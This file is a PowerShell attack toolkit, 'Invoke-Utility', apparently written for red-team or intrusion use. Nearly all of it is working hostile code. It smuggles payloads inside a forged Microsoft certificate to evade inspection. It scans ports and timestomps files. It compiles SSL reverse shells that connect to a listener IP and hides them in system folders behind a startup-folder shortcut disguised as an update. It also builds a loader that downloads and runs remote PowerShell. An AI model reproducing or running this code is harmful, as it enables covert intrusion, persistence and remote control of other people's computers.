function Invoke-Utility {
<#
                                          
.SYNOPSIS

	Miscellaneous Utilities.

.PARAMETER Help

	Shows detailed help for each function.
	
.PARAMETER List

	Shows brief command usage list.

.PARAMETER NewCer

	Generates a .cer certificate file with an "inactive" (no "MZ", "TVq" reference in the base64) payload section. This command should be invoked on attacker side, and certificate transferred to target via some other means. The certificate, should pass most inspection, and loads as a semi-valid certificate without any typical indicators of embedded payload. The resulting certificate can then be "decoded" and "activated" with the "-CerFile", "-Decode" and "-PayloadOut" parameters. Utilizes certutil.exe to encode and decode the certificate file.See example.
	
.PARAMETER TcpScan

	A Simple TCP Port Scanner.
	
.PARAMETER TimeStomp

	Modifies a files' Creation Time to that of C:\windows\system32\cmd.exe. The 'TimeOf' parameter can be used to change the timestamp to match that of some other file.
	
.PARAMETER NewXuLiE

	Compiles a reverse (PowerShell) HTTPS shell .NET executable in real-time using csc.exe and utilizes System.Management.Automation.dll for its functionality. It then drops the resulting executable in a randomly selected directory and creates a .lnk in current users' StartUp for persistence. The generated file will have a randomly-generated file name, a .dat extension and will be executed via "cmd /c start file.dat" in the .LNK
 
     Requires an SSL listener on the attacker-side.

.PARAMETER NewPsDat

	Compiles a .NET executable as a .DAT file in real-time using csc.exe and utilizes System.Management.Automation.dll for its functionality. The resulting .DAT file takes a URL to a PowerShell script as its first argument, and a valid function (within the remote) script for its second. If no valid function call is needed, supply a junk value for the second argument, in other words, it requires two arguments to fire either way. The generated file will have a randomly-generated file name, a .dat extension and can be executed via "cmd /c start file.dat", etc. Or just rename the extension to .exe and launch it as usual.

.PARAMETER NewReverse

	Compiles a reverse (PowerShell) HTTPS shell .NET executable (exe) in real-time using csc.exe and utilizes System.Management.Automation.dll for its functionality.
	
	Requires an SSL listener on the attacker-side.

	
.EXAMPLE
	
	(Generate a certificate with a payload of "payload.exe" in base64.)
	Invoke-Utility -NewCer -Payload C:\temp\payload.exe
	
	The above command should be invoked on attacker side, and certificate transferred to target via some other means. The certificate, should pass most inspection, and loads as a semi-valid certificate without any typical indicators of embedded payload.
	
	(Decode and drop the payload in C:\payload.exe)
	Invoke-Utility -NewCer -CerFile -Decode -PayloadOut C:\payload.exe

.EXAMPLE

	Invoke-Utility -TcpScan -IpAddress 192.168.0.1 -Ports 80,443,3389,22,445
	
.EXAMPLE
	
	(Time Stomps C:\payload.exe to match C:\windows\system32\cmd.exe)
	Invoke-Utility -TimeStomp -File C:\payload.exe
	
	(Time Stomps C:\payload.exe to match C:\Users\user\Documents\foo.doc)
	Invoke-Utility -TimeStomp -File C:\payload.exe -TimeOf C:\Users\user\Documents\foo.doc
	
.EXAMPLE 

	Invoke-Utility -NewXuLiE -ListenerIp 192.168.0.1 -ListenerPort 443 -LnkName "Link Name"
	
.EXAMPLE

	Invoke-Utility -NewPsDat

.EXAMPLE

	Invoke-Utility -NewReverse -ListenerIp 192.168.0.1 -ListenerPort 443
	
.NOTES

	Author: Fabrizio Siciliano (@0rbz_)
	
#>
[CmdletBinding()]
param (

	[Parameter(Position=1)]
	[Switch]$Help,
	[Switch]$List,
	
	[Parameter(Mandatory = $False)]
	[Switch]$NewCer,
	[Switch]$Decode,
	[String]$Payload,
	[String]$PayloadOut,
	[String]$CerFile,
	
	[Parameter(Mandatory = $False)]
	[Switch]$TcpScan,
	[String]$IpAddress,
	$Ports,
	[Switch]$Force,
	
	[Parameter(Mandatory = $False)]
	[Switch]$TimeStomp,
	[String]$File,
	[String]$TimeOf,
	
	[Parameter(Mandatory = $False)]
	[Switch]$NewXuLiE,
	[String]$ListenerIp,
	[String]$ListenerPort,
	[String]$LnkName,
	
	[Parameter(Mandatory = $False)]
	[Switch]$NewPsDat,
	
	[Parameter(Mandatory = $False)]
	[Switch]$NewReverse,
	[string]$ListenerIp2=[String]$ListenerIp,
	[string]$ListenerPort2=[String]$ListenerPort
	
)

$DataDirs = @(
	("C:\ProgramData\Intel"),
	("C:\ProgramData\Microsoft\Crypto\SystemKeys"),
	("C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys"),
	("C:\ProgramData\Microsoft\Crypto\SystemKeys"),
	("C:\ProgramData\Microsoft\Diagnosis"),
	("C:\ProgramData\Microsoft\Diagnosis\FeedbackHub"),
	("C:\ProgramData\Microsoft\Diagnosis\Scripts"),
	("C:\ProgramData\Microsoft\Network\Downloader"),
	("C:\ProgramData\Microsoft\Office\Heartbeat"),
	("C:\ProgramData\Microsoft\Search\Data"),
	("C:\ProgramData\Microsoft\Search\Data\Applications"),
	("C:\ProgramData\Microsoft\Search\Data\Temp"),
	("C:\ProgramData\WindowsHolographicDevices"),
	("C:\Users\Public\Libraries"),
	("C:\Users\Public\AccountPictures"),
	("C:\Users\Public\Documents"),
	("C:\Users\Public\Downloads"),
	("C:\Users\Public\Music"),
	("C:\Users\Public\Pictures"),
	("C:\Users\Public\Videos"),
	("C:\Users\Public\Roaming"),
	("C:\Windows\debug\WIA"),
	("C:\Windows\ServiceProfiles\LocalService"),
	("C:\Windows\ServiceProfiles\LocalService\AppData"),
	("C:\Windows\ServiceProfiles\LocalService\AppData\Local"),
	("C:\Windows\ServiceProfiles\LocalService\AppData\LocalLow"),
	("C:\Windows\Temp"),
	("C:\windows\system32\config"),
	("C:\Windows\System32\LogFiles\WMI"),
	("C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys")
)

$NewArray = foreach ($datadir in $datadirs) {
	if (Test-Path $datadir) {
	@($datadir)
	}
}
$datadir = ($newarray[(get-random -Maximum ([array]$newarray).count)])

$ListenerIp = "$ListenerIp"
$ar = $ListenerIp.Split('.')
$Octet1 = "{0:X2}" -f [int]$ar[0]
$Octet2 = "{0:X2}" -f [int]$ar[1]
$Octet3 = "{0:X2}" -f [int]$ar[2]
$Octet4 = "{0:X2}" -f [int]$ar[3]
$Hexip = "0x"+$Octet1 + $Octet2 + $Octet3 + $Octet4

$FWDir = $([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())
$SmaDll = [PSObject].Assembly.Location
$CsFile = "$DataDir\$Z.cs"
$Compiler = "$FWDir" + "c?c.??e"
$CompilerArgs = "/r:$SmaDll /t:winexe /out:$DataDir\$Z.dat $CsFile"
$StartUp = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup"
$TimeSource = (Get-Item C:\windows\system32\cmd.exe).FullName
$X = (-join ((65..90) + (97..122) | Get-Random -Count 11 | foreach {[char]$_}))
$Z = (-join ((65..90) + (97..122) | Get-Random -Count 5 | foreach {[char]$_}))

		if ($Help) {
		Write @"

 ### Invoke-Utility Help ###
 --------------------------------
 Available Invoke-Utility Commands:
 --------------------------------
 |---------------------------------------------------------------------|
 | -NewCer [-Payload] payload                                          |
 |---------------------------------------------------------------------|

   [*] Description: Creates a .cer file containing a deactivated
       payload. Use the -Decode -CerFile and -PayloadOut parameters to 
       activate and drop the resulting payload. Utilizes certutil to encode
       and decode the certificate file.

   [*] Usage: Invoke-Utility -NewCer -Payload C:\payloads\payload.exe
       Usage: Invoke-Utility -NewCer -CerFile cert.cer -Decode -PayloadOut C:\payload.exe
   
   [*] Mitre ATT&CK Ref: 
   
 |---------------------------------------------------------------------|
 | -TcpScan [-IpAddress] ip_address [-Ports] ports [-Force]            |
 |---------------------------------------------------------------------|

   [*] Description: Simple TCP Port Scanner.

   [*] Usage: Invoke-Utility -TcpScan -IpAddress 192.168.0.1 -Ports 80,443,8080
   [*] Usage: Invoke-Utility -TcpScan -IpAddress 192.168.0.1 -Ports 80,443,8080 -Force
       (Will attempt to scan the host in the case ICMP echo request is blocked.)
   
   [*] Mitre ATT&CK Ref: T1423 (Network Service Scanning)
   
 |----------------------------------------------------------------------|
 | -TimeStomp [-File] file.exe [-TimeOf] someotherfile.exe              |
 |----------------------------------------------------------------------|

   [*] Description: Modifies a files' Creation Time to that of 
       C:\windows\system32\cmd.exe. The 'TimeOf' parameter can be used
       to change the timestamp to match that of some other file.

   [*] Usage: Invoke-Utility -TimeStomp -File C:\temp\file.exe
   [*] Usage: Invoke-Utility -TimeStomp -File C:\temp\file.exe -TimeOf C:\windows\system32\calc.exe

   [*] Mitre ATT&CK Ref: T1099 (Timestomp)
   
 |----------------------------------------------------------------------|
 | -NewXuLiE [-ListenerIp] ip [-ListenerPort] port [-LnkName] "lnk name"|
 |----------------------------------------------------------------------|
 
 [*] Description: Compiles a reverse (PowerShell) HTTPS shell .NET executable in 
     real-time using csc.exe which utilizes System.Management.Automation.dll for 
     its functionality. It drops the resulting executable in a randomly selected 
     directory. Creates a .lnk in StartUp for persistence. The generated file will 
     have a randomly-generated file name, a .dat extension and be executed via 
     "cmd /c start file.dat".
 
     Reverse Shell requires an SSL-enabled listener.

 [*] Usage: Invoke-Utility -NewXuLiE -ListenerIp 192.168.1.2 -ListenerPort 443 -LnkName "Windows Update"
   
 \---------------------------------------------------------------------/
   
"@
	}
	elseif ($List) {
		Write @"  

 Invoke-Utility Brief Command Usage:
 -----------------------------------
 Invoke-Utility -NewCer -Payload C:\payload.exe
 Invoke-Utility -NewCer -CerFile "Certificate File.cer" -Decode -PayloadOut C:\temp\file.exe
 Invoke-Utility -TcpScan -IpAddress 192.168.0.1 -Ports 80,443,8080
 Invoke-Utility -TimeStomp -File C:\temp\file.exe
 Invoke-Utility -TimeStomp -File C:\temp\file.exe -TimeOf C:\windows\system32\calc.exe
 Invoke-Utility -NewXuLiE -ListenerIp 192.168.1.2 -ListenerPort 443 -LnkName "Windows Update"
 Invoke-Utility -NewPsDat
 Invoke-Utility -NewReverse -ListenerIp 192.168.13.1 -ListenerPort 443

"@
	}
	elseif ($NewCer -and $Payload) {
		
		$CertHeader = @"
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 16:00:00:A2:26:52:71:71:F7:54:AC:C4:16:00:00:00:00:A2:26
    Signature Algorithm: PKCS #1 SHA-256 With RSA Encryption
        Issuer: C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, OU=Microsoft IT, CN=Microsoft IT TLS CA 4
        Validity
            Not Before: January 16, 2018, 16:24:02 GMT-5
            Not After : January 16, 2020, 16:24:02 GMT-5
        Subject: C=US, ST=WA, O=Microsoft Corporation, OU=Microsoft , CN=www.microsoft.com
        Subject Public Key Info:
            Public Key Algorithm: PKCS #1 RSA Encryption
                Public-Key: (2048 bit)
                Modulus:
                    cc:ea:e2:84:3c:1b:a9:35:2e:01:5d:15:9d:85:4e:91:
					cd:ac:15:3f:6e:e5:16:8e:1e:88:03:a5:a0:41:da:5d:
					83:35:0e:83:d4:27:1c:6d:fa:ec:a1:c2:49:3c:c8:86:
					45:28:b2:bd:00:a5:f4:aa:da:93:54:53:a1:dd:31:64:
					ef:bb:86:24:a9:5f:ca:e8:29:56:cf:b9:b0:61:9f:7e:
					17:74:cb:67:06:4b:23:a5:b4:92:dc:7f:fb:f7:d6:d4:
					63:78:df:f1:36:2f:42:78:7b:5c:2b:8e:a4:b2:a8:29:
					f6:47:53:0d:dd:48:bb:10:ce:f5:f3:78:e4:b4:4f:66:
					44:6e:3a:93:72:c9:70:07:94:cc:95:0c:ee:17:7e:0b:
					7c:09:81:ff:b2:c9:ab:d5:9a:98:af:df:1d:3b:d8:80:
					89:4f:9e:16:bc:fa:86:e0:42:00:97:c5:cc:c5:d6:ce:
					76:e9:c2:bb:1d:e3:54:e3:13:9c:cf:26:41:da:07:d0:
					4e:2a:e2:d9:c9:27:c4:42:12:11:7b:07:b1:16:d2:57:
					95:3f:3c:2a:3e:92:7c:8a:1e:da:76:99:c6:a0:d6:fe:
					d4:15:57:34:71:20:3d:3d:da:65:dd:54:48:cb:d8:c6:
					7a:1a:87:0d:93:5a:4f:7b:3a:98:f3:03:94:8e:00:3b

                Exponent: 65537 (0x10001)

    Signature Algorithm: PKCS #1 SHA-256 With RSA Encryption
		65:00:c1:18:79:18:58:04:68:88:0a:6c:29:c9:ec:d2:
		57:c4:ba:8b:c5:ba:1f:42:43:76:4c:55:30:e3:0e:1b:
		e5:b3:42:1c:b9:d7:6d:12:f1:13:5d:d0:7e:87:cf:af:
		80:8c:78:8c:2e:d2:9a:c4:6b:a4:41:f6:f1:7d:3a:a8:
		46:42:31:dd:6f:3c:ff:eb:10:8f:59:63:00:27:cd:a6:
		c1:fc:74:64:1a:c3:c7:bf:f8:64:8d:56:e1:72:ca:98:
		56:43:f2:0f:d3:18:73:e7:20:44:4d:0d:82:08:7e:97:
		67:c8:b9:2c:6b:32:f1:70:d2:22:ec:13:fe:d9:93:28:
		99:15:67:cb:91:d7:6e:fd:b7:bb:82:3a:18:21:b3:72:
		4b:a1:36:1d:09:07:95:ec:73:f5:00:54:30:71:11:51:
		80:6e:a9:ec:be:73:59:78:e5:64:e0:2c:95:16:b2:a7:
		88:64:9d:35:a1:e9:0b:91:d9:11:e2:d8:35:a5:96:e7:
		16:30:de:44:1a:85:2e:75:14:d5:13:07:96:02:a8:74:
		96:0f:33:30:42:91:91:91:93:49:82:64:90:c9:71:9b:
		fa:d8:73:5d:4f:f6:6e:cf:8c:87:2f:3e:8a:41:c8:e9:
		55:96:9c:63:2a:9e:04:1a:89:b6:eb:39:cd:22:4a:3f:
		c9:7d:32:a6:58:6e:28:6c:98:09:57:65:d7:97:3f:08:
		81:f9:81:1e:18:61:06:8b:68:83:57:7f:5e:4a:ce:ab:
		3c:22:f5:05:86:79:92:f7:e8:05:d4:9f:4c:03:e6:be:
		22:b8:7b:30:94:b8:12:ff:93:86:2e:96:ca:ea:ba:80:
		02:fd:2c:fe:c4:55:44:04:af:aa:75:85:dc:cf:18:05:
		33:15:e7:c7:a5:e3:c6:42:86:62:b7:f7:de:0e:9e:ff:
		d5:de:c4:7b:32:5a:89:50:86:b9:9b:64:4d:c6:ad:39:
		87:f6:16:ea:87:46:e0:fb:de:6a:86:4d:28:ab:e8:83:
		5b:2d:cb:8f:96:67:7b:16:9b:06:0f:eb:fa:cc:f1:4c:
		d9:8f:a7:42:c8:bc:c7:0c:d5:85:bd:86:40:32:0d:8b:
		83:48:1d:18:79:ef:e9:f8:1c:89:51:e3:08:4f:9e:45:
		fd:83:bf:42:da:9c:ed:9d:af:36:f9:ea:ff:6d:bd:9e:
		5c:b6:96:0f:00:57:00:e5:88:7d:f4:86:5a:08:7d:f1:
		17:31:8d:f1:25:6c:03:50:6e:94:8f:ef:a0:fb:cd:fc:
		b4:1c:14:38:5f:70:ac:12:30:87:da:48:f0:44:0b:5b:
		d1:d4:44:ec:d2:83:c0:0b:cb:bb:60:55:6b:a8:c0:5a
-----BEGIN CERTIFICATE-----
MIIHnzCCBYegAwIBAgITFgAAoiZScXH3VKzEFgAAAACiJjANBgkqhkiG9w0BAQsF
ADCBizELMAkGA1UEBhMCVVMxEzARBgNVBAgTCldhc2hpbmd0b24xEDAOBgNVBAcT
B1JlZG1vbmQxHjAcBgNVBAoTFU1pY3Jvc29mdCBDb3Jwb3JhdGlvbjEVMBMGA1UE
CxMMTWljcm9zb2Z0IElUMR4wHAYDVQQDExVNaWNyb3NvZnQgSVQgVExTIENBIDQw
HhcNMTgwMTE2MjEyNDAyWhcNMjAwMTE2MjEyNDAyWjCBiDELMAkGA1UEBhMCVVMx
CzAJBgNVBAgTAldBMRAwDgYDVQQHEwdSZWRtb25kMR4wHAYDVQQKExVNaWNyb3Nv
ZnQgQ29ycG9yYXRpb24xHjAcBgNVBAsTFU1pY3Jvc29mdCBDb3Jwb3JhdGlvbjEa
MBgGA1UEAxMRd3d3Lm1pY3Jvc29mdC5jb20wggEiMA0GCSqGSIb3DQEBAQUAA4IB
DwAwggEKAoIBAQDM6uKEPBupNS4BXRWdhU6RzawVP27lFo4eiAOloEHaXYM1DoPU
Jxxt+uyhwkk8yIZFKLK9AKX0qtqTVFOh3TFk77uGJKlfyugpVs+5sGGffhd0y2cG
SyOltJLcf/v31tRjeN/xNi9CeHtcK46ksqgp9kdTDd1IuxDO9fN45LRPZkRuOpNy
yXAHlMyVDO4Xfgt8CYH/ssmr1ZqYr98dO9iAiU+eFrz6huBCAJfFzMXWznbpwrsd
41TjE5zPJkHaB9BOKuLZySfEQhIRewexFtJXlT88Kj6SfIoe2naZxqDW/tQVVzRx
ID092mXdVEjL2MZ6GocNk1pPezqY8wOUjgA7AgMBAAGjggL7MIIC9zCBmQYDVR0R
BIGRMIGOghVwcml2YWN5Lm1pY3Jvc29mdC5jb22CEWMucy1taWNyb3NvZnQuY29t
gg1taWNyb3NvZnQuY29tghFpLnMtbWljcm9zb2Z0LmNvbYIYc3RhdGljdmlldy5t
aWNyb3NvZnQuY29tghF3d3cubWljcm9zb2Z0LmNvbYITd3d3cWEubWljcm9zb2Z0
LmNvbTAdBgNVHQ4EFgQUMqJLlf7sAXZDo1IX+BIPkeyx9OcwHwYDVR0jBBgwFoAU
enuMwc/noMoc1Gv6++Ezww8aop0wgawGA1UdHwSBpDCBoTCBnqCBm6CBmIZLaHR0
cDovL21zY3JsLm1pY3Jvc29mdC5jb20vcGtpL21zY29ycC9jcmwvTWljcm9zb2Z0
JTIwSVQlMjBUTFMlMjBDQSUyMDQuY3JshklodHRwOi8vY3JsLm1pY3Jvc29mdC5j
b20vcGtpL21zY29ycC9jcmwvTWljcm9zb2Z0JTIwSVQlMjBUTFMlMjBDQSUyMDQu
Y3JsMIGFBggrBgEFBQcBAQR5MHcwUQYIKwYBBQUHMAKGRWh0dHA6Ly93d3cubWlj
cm9zb2Z0LmNvbS9wa2kvbXNjb3JwL01pY3Jvc29mdCUyMElUJTIwVExTJTIwQ0El
MjA0LmNydDAiBggrBgEFBQcwAYYWaHR0cDovL29jc3AubXNvY3NwLmNvbTA+Bgkr
BgEEAYI3FQcEMTAvBicrBgEEAYI3FQiH2oZ1g+7ZAYLJhRuBtZ5hhfTrYIFdhNLf
QoLnk3oCAWQCARowHQYDVR0lBBYwFAYIKwYBBQUHAwIGCCsGAQUFBwMBMAsGA1Ud
DwQEAwIEsDBNBgNVHSAERjBEMEIGCSsGAQQBgjcqATA1MDMGCCsGAQUFBwIBFido
dHRwOi8vd3d3Lm1pY3Jvc29mdC5jb20vcGtpL21zY29ycC9jcHMwJwYJKwYBBAGC
NxUKBBowGDAKBggrBgEFBQcDAjAKBggrBgEFBQcDATANBgkqhkiG9w0BAQsFAAOC
AgEAZQDBGHkYWARoiApsKcns0lfEuovFuh9CQ3ZMVTDjDhvls0IcuddtEvETXdB+
h8+vgIx4jC7SmsRrpEH28X06qEZCMd1vPP/rEI9ZYwAnzabB/HRkGsPHv/hkjVbh
csqYVkPyD9MYc+cgRE0Nggh+l2fIuSxrMvFw0iLsE/7ZkyiZFWfLkddu/be7gjoY
IbNyS6E2HQkHlexz9QBUMHERUYBuqey+c1l45WTgLJUWsqeIZJ01oekLkdkR4tg1
pZbnFjDeRBqFLnUU1RMHlgKodJYPMzBCkZGRk0mCZJDJcZv62HNdT/Zuz4yHLz6K
QcjpVZacYyqeBBqJtus5zSJKP8l9MqZYbihsmAlXZdeXPwiB+YEeGGEGi2iDV39e
Ss6rPCL1BYZ5kvfoBdSfTAPmviK4ezCUuBL/k4YulsrquoAC/Sz+xFVEBK+qdYXc
zxgFMxXnx6XjxkKGYrf33g6e/9XexHsyWolQhrmbZE3GrTmH9hbqh0bg+95qhk0o
q+iDWy3Lj5ZnexabBg/r+szxTNmPp0LIvMcM1YW9hkAyDYuDSB0Yee/p+ByJUeMI
T55F/YO/Qtqc7Z2vNvnq/229nly2lg8AVwDliH30hloIffEXMY3xJWwDUG6Uj++g
+838tBwUOF9wrBIwh9pI8EQLW9HUROzSg8ALy7tgVWuowFo=
-----END CERTIFICATE-----
"@ + "`n"

		
		Try {
			
			$CerLocal = "$env:temp" + "\$X.cer"
			(C:\w?*n???s\s*3?\?er??ti?.?x? -encode -f $Payload $CerLocal)
			
			$NewCertificate = (Get-Content "$CerLocal")[1]
			$ReplacementString = $NewCertificate -replace '^TVq', 'AAA'
			
			$CertHeader + (Get-Content "$CerLocal" | Out-String) | Set-Content "$CerLocal"
			
			$NewCert = Get-Content $CerLocal
			$NewCert[110] = $ReplacementString
			$NewCert | Out-File $CerLocal -Encoding UTF8

			Write "`n [+] Certificate file at $CerLocal. `n     Use -NewCer -CerFile -Decode -PayloadOut to activate and drop payload.`n"
		}
		Catch {
			Write "`n [!] Unknown Error.`n"
		}
	}
	
	elseif ($NewCer -and $CerFile -and $Decode -and $PayloadOut) {
		
		Try {

			Get-Content "$CerFile" | Out-File "$env:temp\$X" -Encoding UTF8
			$Newb64 = Get-Content "$env:temp\$X"
			$Newb64 | Select-Object -Skip 109 | Out-File "$env:temp\$X" -Encoding UTF8
			
			$Newb64 = (Get-Content "$env:temp\$X")[1]
			$ReplacementString = $Newb64 -replace '^AAA', 'TVq'
			
			$Newb4 = Get-Content "$env:temp\$X"
			$Newb4[1] = $ReplacementString
			$Newb4 | Out-File "$env:temp\$X" -Encoding UTF8
			
			(C:\w?*n???s\s*3?\?er??ti?.?x? -decode -f "$env:temp\$X" $PayloadOut)
			
			$Newb64 = (Get-Content "$env:temp\$X")[1]
			$ReplacementString = $Newb64 -replace '^TVq', 'AAA'
			
			$Newb4 = Get-Content "$env:temp\$X"
			$Newb4[1] = $ReplacementString
			$Newb4 | Out-File "$env:temp\$X" -Encoding UTF8
			
			# clean up
			Remove-Item "$env:temp\$X"
			$GetCerFile = Get-Content "$CerFile"
			$GetCerFile | Select-Object -First 109 | Out-File "$CerFile" -Encoding UTF8
			
			Write "`n [+] Certificate decoded and payload at $PayloadOut.`n"
		
		}
		Catch {
			Write "Unknown Error."
		}
	}
	
	elseif ($TCPScan -and $IpAddress) {
	
		if ($PSVersionTable.PSVersion.Major -eq "2") {
			Write "`n [!] This function requires PowerShell version greater than 2.0.`n"
			return
		}
		if ($(Test-Connection -Quiet -Count 1 $IpAddress)) {
	
			foreach ($Port in $Ports) {
			
				$TcpClient = New-Object System.Net.Sockets.TcpClient
				$Connect = $TcpClient.BeginConnect($IpAddress, $Port, $Null, $Null)
				$TimeOut = $Connect.AsyncWaitHandle.WaitOne(5, $True)
			
				if (!$TimeOut) {
					$TcpClient.Close() 
					sleep 1
				}
				else {
					Write "Open: $Port"
					$TcpClient.Close()
					sleep 1
				}
			}
		}
		else {
			Write "Host appears offline."
		}
	}
	elseif ($TCPScan -and $IpAddress -and $Force) {
		if ($PSVersionTable.PSVersion.Major -eq "2") {
		Write "`n [!] This function requires PowerShell version greater than 2.0.`n"
		return
	}
		if (!$(Test-Connection -Quiet -Count 1 $IpAddress)) {
	
			foreach ($Port in $Ports) {
				
				$TcpClient = New-Object System.Net.Sockets.TcpClient
				$Connect = $TcpClient.BeginConnect($IpAddress, $Port, $Null, $Null)
				$TimeOut = $Connect.AsyncWaitHandle.WaitOne(5, $True)
				
				if (!$TimeOut) {
					$TcpClient.Close() 
					sleep 1
				}
				else {
					Write "Open: $Port"
					$TcpClient.Close()
					sleep 1
				}
			}
		}
	}
	elseif ($TimeStomp -and $File -and $TimeOf) {
	
		$TimeSource = (Get-Item $TimeOf).FullName
		[IO.File]::SetCreationTime("$File", [IO.File]::GetCreationTime($TimeSource))
		[IO.File]::SetLastAccessTime("$File", [IO.File]::GetLastAccessTime($TimeSource))
		[IO.File]::SetLastWriteTIme("$File", [IO.File]::GetLastWriteTime($TimeSource))
		
		Write " `n[+] Changed Creation, Last Access, and Last Write Time for $File`:"
		(Get-Item $File)
	}
	elseif ($TimeStomp -and $File -and !$TimeOf) {
	
		[IO.File]::SetCreationTime("$File", [IO.File]::GetCreationTime($TimeSource))
		[IO.File]::SetLastAccessTime("$File", [IO.File]::GetLastAccessTime($TimeSource))
		[IO.File]::SetLastWriteTIme("$File", [IO.File]::GetLastWriteTime($TimeSource))
		
		Write " `n[+] Changed Creation, Last Access, and Last Write Time for $File`:"
		(Get-Item $File)
	}
	
	elseif ($NewXuLiE -and $ListenerIp -and $ListenerPort -and $LnkName -and $(Test-Path "$Compiler")) {
		
		$source = @"
using System.Collections.ObjectModel;
using System.Management.Automation;

namespace $X
{
    class $X
    {
        static void Main(string[] args)
        {
            using (PowerShell $Z = PowerShell.Create().AddScript(@"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

`$proxy = (New-Object System.Net.WebClient)
`$proxy.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

`$socket = New-Object System.Net.Sockets.TCPClient('$Hexip','$ListenerPort')

`$stream = `$socket.GetStream()

`$sslStream = New-Object System.Net.Security.SslStream(`$stream,`$false,({`$True} -as [Net.Security.RemoteCertificateValidationCallback]))

`$sslStream.AuthenticateAsClient('$Hexip')

[byte[]]`$bytes = 0..65535 | % {0}
while((`$x = `$sslStream.Read(`$bytes,0,`$bytes.Length)) -ne 0) {

	`$data = (New-Object System.Text.ASCIIEncoding).GetString(`$bytes,0,`$x)
	`$flow = (iex `$data 2>&1 | Out-String) + '($Z)' + '> '
	`$flow2 = ([text.encoding]::ASCII).GetBytes(`$flow)
	`$sslStream.Write(`$flow2,0,`$flow2.Length)
	`$stream.Flush()}
	`$socket.Close()"))
            {
                Collection<PSObject> Output = $Z.Invoke();
            }
        }
    }
}
"@

		Try {
			Remove-Item "$StartUp\IE Update.lnk" -ErrorAction SilentlyContinue
			New-Item "$DataDir\$Z.cs" -ItemType File >$null 2>&1
			Add-Content $CsFile $source
			Start-Process -Wi Hidden -FilePath $Compiler -ArgumentList $CompilerArgs
			Sleep 4
			Remove-Item "$DataDir\$Z.cs"
				
			$Command = "cmd.exe"
			$Wss = New-Object -ComObject WScript.Shell
			$LnkCr = $Wss.CreateShortcut("$StartUp\$LnkName.lnk")
			$LnkCr.TargetPath = $Command
			$LnkCr.Arguments = "/c start $Z.dat"
			#$LnkCr.Description ="" # comment field
			$LnkCr.IconLocation = "shell32.dll,244"
			$LnkCr.WorkingDirectory ="$DataDir"
			$LnkCr.Save()
				
			Write "`n [+] Agent dropped at --> $DataDir\$Z.dat and Startup Link Installed.`n"
		}
		Catch {
			Write "Unknown Error."
		}
	}
	
	elseif ($NewPsDat -and $(Test-Path $Compiler)) {
		
		$Source = @"
using System.Collections.ObjectModel;
using System.Management.Automation;

namespace $Z
{
    class $Z
    {
        static void Main(string[] args)
        {
            if (args.Length == 0 || args.Length == 1) return;
            using (PowerShell $X = PowerShell.Create().AddScript("Invoke-Expression (New-Object Net.Webclient).DownloadString("+"'"+args[0]+"'"+")"+";"+args[1]))
            {
                Collection<PSObject> Output = $X.Invoke();
            }
        }
    }
}
"@	 
		Try {
		
			New-Item "$DataDir\$Z.cs" -ItemType File >$null 2>&1
			Add-Content $CsFile $source
			Start-Process -Wi Hidden -Fi $Compiler -Arg $CompilerArgs
			Sleep 4
			Remove-Item "$DataDir\$Z.cs"
			Write "`n [+] Output --> $DataDir\$Z.dat`n"
		}
		Catch {
			Write "Unknown Error."
		}
	}
	
	elseif ($NewReverse -and $ListenerIp -and $ListenerPort -and $(Test-Path $Compiler)) {
	
		$Source = @"
using System.Collections.ObjectModel;
using System.Management.Automation;

namespace $Z
{
    class $Z
    {
        static void Main(string[] args)
        {
            using (PowerShell $X = PowerShell.Create().AddScript(@"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

`$proxy = (New-Object System.Net.WebClient).Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

`$socket = New-Object System.Net.Sockets.TCPClient('$Hexip','$ListenerPort')

`$stream = `$socket.GetStream()

`$sslStream = New-Object System.Net.Security.SslStream(`$stream,`$false,({`$True} -as [Net.Security.RemoteCertificateValidationCallback]))

`$sslStream.AuthenticateAsClient('$Hexip')

[byte[]]`$bytes = 0..65535 | % {0}
while((`$x = `$sslStream.Read(`$bytes,0,`$bytes.Length)) -ne 0) {

	`$data = (New-Object System.Text.ASCIIEncoding).GetString(`$bytes,0,`$x)
	`$flow = (iex `$data 2>&1 | Out-String) + '(PS Shell) ' + '> '
	`$flow2 = ([text.encoding]::ASCII).GetBytes(`$flow)
	`$sslStream.Write(`$flow2,0,`$flow2.Length)
	`$stream.Flush()}
	`$socket.Close()"))
            {
                Collection<PSObject> Output = $X.Invoke();
            }
        }
    }
}
"@
		Try {
		
			$CompilerArgs = "/r:$SmaDll /t:winexe /out:$DataDir\$Z.exe $CsFile"
			New-Item "$DataDir\$Z.cs" -ItemType File >$null 2>&1
			Add-Content $CsFile $Source
			Start-Process -Wi Hidden -FilePath $Compiler -ArgumentList $CompilerArgs
			Sleep 4
			Remove-Item $DataDir\$Z.cs
			Write "`n [+] Reverse Shell --> $DataDir\$Z.exe`n"
		}
		Catch {
			Write "Unknown Error."
		}
	}
}